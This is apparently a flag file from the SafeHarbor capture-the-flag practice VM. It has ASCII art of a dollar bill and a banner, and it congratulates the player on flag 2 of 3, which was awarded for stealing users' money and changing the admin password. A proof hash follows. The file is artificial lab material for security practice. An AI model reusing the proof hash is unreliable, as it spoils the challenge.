 ||&\===//                `).'' .'`_.- `. '.'.(`  A 76355942 J  \\===/&||
 ||&%'-'%/1                // .' /`     \    \\                  \%'-'%||
 ||%&%&%/`   d8888b       // /   \  _  _;,    \\      .-"""-.  1 `&%&%%||
 ||&%&%&    8P |) Yb     ;; (     > a  a| \    ;;    //A`Y A\\    &%&%&||
 ||&%&%|    8b |) d8     || (    ,\   \ |  )   ||    ||.-'-.||    |%&%&||
 ||%&%&|     Y8888P      ||  '--'/`  -- /-'    ||    \\_/~\_//    |&%&%||
 ||%&%&|                 ||     |\`-.__/       ||     '-...-'     |&%&%||
 ||%%%%|                 ||    /` |._ .|-.     ||                 |%&%&||
 ||%&%&|  A 76355942 J  /;\ _.'   \  } \  '-.  /;\                |%&%&||
 ||&%.-;               (,  '.      \  } `\   \'  ,)   ,.,.,.,.,   ;-.%&||
 ||%( | ) 1  """""""   _( \  ;...---------.;.; / )_ ```""""""" 1 ( | )%||
 ||&%'-'==================\`------------------`/=================='-'%&||
 ||%&JGS&%&%&%&%%&%&&&%&%%&)O N E  D O L L A R(%&%&%&%&%&%&%%&%&&&%&%%&||
 '""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""`
 
 
  $$$$$$\             $$$$$$\           $$\   $$\                     $$\                           
$$  __$$\           $$  __$$\          $$ |  $$ |                    $$ |                          
$$ /  \__| $$$$$$\  $$ /  \__|$$$$$$\  $$ |  $$ | $$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\   \____$$\ $$$$\    $$  __$$\ $$$$$$$$ | \____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\  $$$$$$$ |$$  _|   $$$$$$$$ |$$  __$$ | $$$$$$$ |$$ |  \__|$$ |  $$ |$$ /  $$ |$$ |  \__|
$$\   $$ |$$  __$$ |$$ |     $$   ____|$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |      
\$$$$$$  |\$$$$$$$ |$$ |     \$$$$$$$\ $$ |  $$ |\$$$$$$$ |$$ |      $$$$$$$  |\$$$$$$  |$$ |      
 \______/  \_______|\__|      \_______|\__|  \__| \_______|\__|      \_______/  \______/ \__|      
                                                                                                   
 

Congratulations! You've finished SafeHarbor! This is flag 2 of 3. 			
Bonus flags will appear based on actions taken during the course of the VM.
(You got this one because you stole everyone's money and changed the admin password. Not very nice.)

Proof: 5f251959b043f2b526054a6a94fc1b24

Author: AbsoZed (Dylan Barker)

```